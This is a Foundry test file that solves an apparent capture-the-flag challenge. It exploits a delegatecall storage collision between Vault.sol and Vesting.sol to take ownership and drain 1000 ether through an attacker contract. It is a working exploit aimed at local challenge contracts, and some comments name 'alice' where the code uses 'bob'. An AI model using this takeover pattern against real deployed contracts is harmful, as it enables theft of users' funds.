// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/Vault.sol";
import "../src/Vesting.sol";

/**
 * The exploit is based on storage collision, if contract A calls
 * contract B via delegatecall, the code of contract B with storage of
 * contract A will be executed. In our case Vault.sol delegatecalls
 * Vesting.sol, so Vesting.sol accesses the storage of Vault.sol
 * If we take a look at the storage layout of both contracts, we immediately
 * see whats wrong:
 *
 * |Vault.sol           |Vesting.sol              |
 * |--------------------|-------------------------|
 * |address delegate    |address beneficiary      | <== Storage collision!
 * |address owner       |uint256 duration         | <== Storage collision!
 *
 * To win this challenge, you have to take ownership of Vault.sol first
 * We can do this by executing function setDuration of Vesting.sol
 * However, theres one small obstacle: duration is of type uint256,
 * but we need an address! Solution: We have to convert our address
 * to a number. This is done pretty easily, since addresses are basically
 * hexadecimal numbers (because of the require statement in setDuration
 * the decimal value of your address has to be higher than the previous one
 * which is the owner of the contract)
 * After you are the owner of the contract, set delegate to an attacker
 * contract which sends all ETH to you
 */

contract Attacker {
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract VaultTest is Test {
    Vault internal vault;
    Vesting internal vesting;

    Attacker internal attacker;

    // use address with leading zeros so setDuration() doesnt fail
    address alice = address(0x000ad5bc95DaB8328fCbB1D47e867A51fA3a802b);

    event DelegateChanged(address indexed previousDelegate, address indexed newDelegate);

    function setUp() public {
        // deploy Vesting and Vault contract
        vesting = new Vesting();

        vm.prank(alice);
        vault = new Vault(address(vesting));

        // give Vault contract ETH
        vm.deal(address(vault), 1000 ether);

        attacker = new Attacker();
    }

    function testAttack() public {
        // alice performs all subsequent calls
        address bob = vm.addr(100);
        vm.startPrank(bob);

        // convert address of alice to uint256
        uint256 duration = uint256(uint160(bob));

        /**
         * We have to bypass the onlyAuth modifier of function _delegate
         * We can do this by calling execute(address, payload). Payload has to be the function
         * signature of setDuration(uint256) and address(this)
         * Since Vault doesnt implement function setDuration(uint256), the fallback function
         * will be executed, which delegates the call to our Vesting contract
         */
        vault.execute(address(vault), abi.encodeWithSignature("setDuration(uint256)", duration));

        // alice should be owner now, change delegate to attack contract
        vault.upgradeDelegate(address(attacker));

        // delegatecall withdraw function from attacker contract
        (bool success,) = address(vault).call(abi.encodeWithSignature("withdraw()"));
        assertEq(success, true);

        // make sure alice has ether from Vault contract
        assertEq(bob.balance, 1000 ether);

        vm.stopPrank();
    }
}
